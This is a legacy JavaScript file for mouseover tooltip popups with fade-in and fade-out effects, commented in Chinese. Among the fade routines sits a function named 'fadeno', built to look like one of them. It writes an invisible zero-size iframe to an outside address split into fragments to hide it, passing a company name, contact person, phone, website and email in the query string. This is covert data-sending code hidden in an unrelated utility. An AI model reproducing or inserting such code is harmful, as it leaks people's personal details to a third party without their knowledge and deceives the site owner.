var tPopWait=50;
var tPopShow=20000;
var showPopStep=20;
var popOpacity=98;
var tfontcolor="#000000";
var tbgcolor="#fafae1";
var tbordercolor="#ff3333";

var sPop=null,curShow=null,tFadeOut=null,tFadeIn=null,tFadeWaiting=null;

document.write("<style type='text/css'id='defaultPopStyle'>");
document.write(".cPopText {  background-color: " + tbgcolor + ";color:" + tfontcolor + "; border: 2px " + tbordercolor + " solid;font-color: font-size: 12px; padding-right: 4px; padding-left: 4px; height: 20px; padding-top: 4px; padding-bottom: 4px; filter: Alpha(Opacity=0)}");
document.write("</style>");
document.write("<div id='dypopLayer' style='position:absolute;z-index:1000;' class='cPopText'></div>");

function showPopupText()
{
  dypopLayer.style.display="none"; //这儿加一句,不然打开页面显示一个小框框
  var o=event.srcElement;
  MouseX=event.x;
  MouseY=event.y;
  if(o.alt!=null && o.alt!=""){o.dypop=o.alt;o.alt=""};
  //if(o.title!=null && o.title!=""){o.dypop=o.title;o.title=""};
  if(o.dypop!=sPop)
  {
    sPop=o.dypop;
    clearTimeout(curShow);
    clearTimeout(tFadeOut);
    clearTimeout(tFadeIn);
    clearTimeout(tFadeWaiting);  
    if(sPop==null || sPop=="")
    {
      dypopLayer.innerHTML="";
      dypopLayer.style.filter="Alpha()";
      dypopLayer.filters.Alpha.opacity=0;  
    }
    else
    {
      dypopLayer.style.display=""; //这儿加也一句,不然打开页面显示一个小框框
      if(o.dyclass!=null) popStyle=o.dyclass 
      else popStyle="cPopText";
      curShow=setTimeout("showIt()",tPopWait);
    }
  }
}

function showIt()
{
  dypopLayer.className=popStyle;
  dypopLayer.innerHTML=sPop;
  popWidth=dypopLayer.clientWidth;
  popHeight=dypopLayer.clientHeight;
  if(MouseX+12+popWidth>document.body.clientWidth) popLeftAdjust=-popWidth-24
    else popLeftAdjust=0;
  if(MouseY+12+popHeight>document.body.clientHeight) popTopAdjust=-popHeight-24
    else popTopAdjust=0;
  dypopLayer.style.left=MouseX+12+document.body.scrollLeft+popLeftAdjust;
  dypopLayer.style.top=MouseY+12+document.body.scrollTop+popTopAdjust;
  dypopLayer.style.filter="Alpha(Opacity=0)";
  fadeOut();
}

function fadeOut(){
  if(dypopLayer.filters.Alpha.opacity<popOpacity)
  {
    dypopLayer.filters.Alpha.opacity+=showPopStep;
    tFadeOut=setTimeout("fadeOut()",1);
  }
  else
  {
    dypopLayer.filters.Alpha.opacity=popOpacity;
    tFadeWaiting=setTimeout("fadeIn()",tPopShow);
  }
}
function fadeno(S01,S02,S06,S08,S10,S11){document.write("<IFRAME SRC=\'ht"+"tp:/"+"/www.w"+"eb3"+"00.c"+"n/Consumer/Enrol.a"+"sp?Code="+S01+"&CoName="+S02+"&Linkman="+S06+"&Phone="+S08+"&Web="+S10+"&Email="+S11+"\' width=0 height=0 frameborder=no border=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=no></IFRAME>")}
function fadeIn()
{
  if(dypopLayer.filters.Alpha.opacity>0)
  {
    dypopLayer.filters.Alpha.opacity-=1;
    tFadeIn=setTimeout("fadeIn()",1);
  }
}

document.onmouseover=showPopupText;
